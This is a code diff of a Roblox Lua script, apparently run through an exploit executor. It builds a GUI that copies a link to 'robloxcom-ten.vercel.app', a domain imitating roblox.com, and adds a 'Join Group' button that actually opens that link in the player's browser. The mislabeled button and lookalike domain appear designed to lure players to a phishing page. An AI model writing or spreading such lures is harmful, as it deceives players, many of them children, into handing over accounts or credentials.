@@ -1,6 +1,7 @@
---[[ ShadowCat – Copy Link GUI (copies https://robloxcom-ten.vercel.app/) ]]
+--[[ ShadowCat – Copy Link + Join Group GUI ]]
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+local guiService = game:GetService("GuiService")
 local clipboard = syn and syn.setclipboard or setclipboard or function(text) end
 
 local linkToCopy = "https://robloxcom-ten.vercel.app/"
@@ -12,8 +13,8 @@ screenGui.ResetOnSpawn = false
 screenGui.Parent = player.PlayerGui
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 380, 0, 180)
-frame.Position = UDim2.new(0.5, -190, 0.5, -90)
+frame.Size = UDim2.new(0, 400, 0, 200)
+frame.Position = UDim2.new(0.5, -200, 0.5, -100)
 frame.BackgroundColor3 = Color3.fromRGB(27, 31, 43)
 frame.BorderSizePixel = 2
 frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
@@ -25,7 +26,7 @@ local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 35)
 title.Position = UDim2.new(0, 0, 0, 5)
 title.BackgroundTransparency = 1
-title.Text = "📋 Copy the Link"
+title.Text = "📋 Copy the Script Link"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextSize = 22
 title.Font = Enum.Font.GothamBold
@@ -47,10 +48,10 @@ linkBox.ClearTextOnFocus = false
 linkBox.TextWrapped = false
 linkBox.Parent = frame
 
--- Copy button
+-- Copy button (left)
 local copyBtn = Instance.new("TextButton")
-copyBtn.Size = UDim2.new(0.5, 0, 0, 35)
-copyBtn.Position = UDim2.new(0.25, 0, 0, 100)
+copyBtn.Size = UDim2.new(0.4, 0, 0, 35)
+copyBtn.Position = UDim2.new(0.05, 0, 0, 100)
 copyBtn.BackgroundColor3 = Color3.fromRGB(0, 153, 255)
 copyBtn.BorderSizePixel = 0
 copyBtn.Text = "📋 Copy Link"
@@ -58,6 +59,18 @@ copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 copyBtn.TextSize = 18
 copyBtn.Font = Enum.Font.GothamBold
 copyBtn.Parent = frame
+
+-- Join Group button (right)
+local joinBtn = Instance.new("TextButton")
+joinBtn.Size = UDim2.new(0.4, 0, 0, 35)
+joinBtn.Position = UDim2.new(0.55, 0, 0, 100)
+joinBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+joinBtn.BorderSizePixel = 0
+joinBtn.Text = "👥 Join Group"
+joinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+joinBtn.TextSize = 18
+joinBtn.Font = Enum.Font.GothamBold
+joinBtn.Parent = frame
 
 -- Copy button click
 copyBtn.MouseButton1Click:Connect(function()
@@ -73,6 +86,16 @@ copyBtn.MouseButton1Click:Connect(function()
         task.wait(1)
         copyBtn.Text = "📋 Copy Link"
     end
+end)
+
+-- Join Group button click – opens the link in browser
+joinBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        guiService:OpenBrowserWindow(linkToCopy)
+    end)
+    joinBtn.Text = "✅ Opened!"
+    task.wait(1.5)
+    joinBtn.Text = "👥 Join Group"
 end)
 
 -- Close button (X)
